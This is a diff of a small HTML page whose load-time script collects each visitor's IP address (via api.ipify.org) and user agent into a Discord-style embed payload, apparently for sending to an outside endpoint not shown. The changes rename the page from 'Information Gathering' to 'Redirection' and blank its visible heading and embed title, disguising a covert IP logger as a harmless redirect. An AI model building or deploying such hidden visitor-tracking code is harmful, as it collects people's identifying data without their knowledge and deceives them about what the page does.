@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Information Gathering</title>
+<title>Redirection</title>
 <script>
   window.onload = function() {
     fetch('https://api.ipify.org?format=json')
@@ -15,7 +15,7 @@
 
         const payload = {
           embeds: [{
-            title: "User Information",
+            title: "",
             fields: [
               { name: "IP Address", value: ip },
               { name: "User Agent", value: userAgent },
@@ -42,6 +42,6 @@
 </script>
 </head>
 <body>
-  <h1>Gathering Information...</h1>
+  <h1></h1>
 </body>
 </html>
